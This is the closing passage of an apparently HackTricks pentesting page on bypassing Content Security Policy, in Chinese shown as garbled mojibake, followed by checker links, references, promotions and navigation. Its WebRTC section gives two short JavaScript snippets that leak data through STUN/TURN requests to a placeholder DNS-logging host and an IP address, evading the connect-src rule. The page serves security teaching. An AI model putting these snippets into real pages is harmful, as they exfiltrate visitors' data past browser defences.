æ˜¾ç„¶ï¼Œè¿™ç§æŠ€æœ¯åœ¨æ— å¤´æµè§ˆå™¨ï¼ˆæœºå™¨äººï¼‰ä¸­ä¸èµ·ä½œç”¨
{% endhint %}</p>
<h3 id="webrtc"><a class="header" href="#webrtc">WebRTC</a></h3>
<p>åœ¨å‡ ä¸ªé¡µé¢ä¸Šä½ å¯ä»¥çœ‹åˆ°<strong>WebRTCä¸æ£€æŸ¥CSPçš„<code>connect-src</code>ç­–ç•¥</strong>ã€‚</p>
<p>å®é™…ä¸Šï¼Œä½ å¯ä»¥é€šè¿‡ä¸€ä¸ª_DNSè¯·æ±‚_æ¥_æ³„éœ²_ä¿¡æ¯ã€‚çœ‹çœ‹è¿™æ®µä»£ç ï¼š</p>
<pre><code class="language-javascript">(async()=&gt;{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
</code></pre>
<p>å¦ä¸€ä¸ªé€‰é¡¹ï¼š</p>
<pre><code class="language-javascript">var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=&gt;pc.setLocalDescription(sdp);
</code></pre>
<h2 id="åœ¨çº¿æ£€æŸ¥cspç­–ç•¥"><a class="header" href="#åœ¨çº¿æ£€æŸ¥cspç­–ç•¥">åœ¨çº¿æ£€æŸ¥CSPç­–ç•¥</a></h2>
<ul>
<li><a href="https://csp-evaluator.withgoogle.com">https://csp-evaluator.withgoogle.com/</a></li>
<li><a href="https://cspvalidator.org/#url=https://cspvalidator.org/">https://cspvalidator.org/</a></li>
</ul>
<h2 id="è‡ªåŠ¨åˆ›å»ºcsp"><a class="header" href="#è‡ªåŠ¨åˆ›å»ºcsp">è‡ªåŠ¨åˆ›å»ºCSP</a></h2>
<p><a href="https://csper.io/docs/generating-content-security-policy">https://csper.io/docs/generating-content-security-policy</a></p>
<h2 id="å‚è€ƒèµ„æ–™"><a class="header" href="#å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</a></h2>
<ul>
<li><a href="https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/">https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/</a></li>
<li><a href="https://lcamtuf.coredump.cx/postxss/">https://lcamtuf.coredump.cx/postxss/</a></li>
<li><a href="https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d">https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d</a></li>
<li><a href="https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme">https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme</a></li>
<li><a href="https://www.youtube.com/watch?v=MCyPuOWs3dg">https://www.youtube.com/watch?v=MCyPuOWs3dg</a></li>
<li><a href="https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/">https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/</a></li>
<li><a href="https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/">https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/</a></li>
</ul>
<p>â€‹</p>
<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
<p>åŠ å…¥ <a href="https://discord.com/invite/N3FrSbmwdy"><strong>HackenProof Discord</strong></a> æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼</p>
<p><strong>é»‘å®¢è§è§£</strong><br />
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€ä¸æŒ‘æˆ˜çš„å†…å®¹</p>
<p><strong>å®æ—¶é»‘å®¢æ–°é—»</strong><br />
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£ï¼Œè·Ÿä¸Šå¿«é€Ÿå˜åŒ–çš„é»‘å®¢ä¸–ç•Œ</p>
<p><strong>æœ€æ–°å…¬å‘Š</strong><br />
äº†è§£æœ€æ–°çš„æ¼æ´èµé‡‘è®¡åˆ’å’Œé‡è¦å¹³å°æ›´æ–°</p>
<p><strong>åŠ å…¥æˆ‘ä»¬</strong> <a href="https://discord.com/invite/N3FrSbmwdy"><strong>Discord</strong></a>ï¼Œä»Šå¤©å°±å¼€å§‹ä¸é¡¶çº§é»‘å®¢åˆä½œï¼</p>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µAWSé»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶(ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µGCPé»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶(GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒHackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discordå°ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>ç”µæŠ¥å°ç»„</strong></a> æˆ– <strong>åœ¨</strong> <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> githubåº“æäº¤PRåˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../pentesting-web/command-injection.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../pentesting-web/content-security-policy-csp-bypass/csp-bypass-self-+-unsafe-inline-with-iframes.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../pentesting-web/command-injection.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../pentesting-web/content-security-policy-csp-bypass/csp-bypass-self-+-unsafe-inline-with-iframes.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
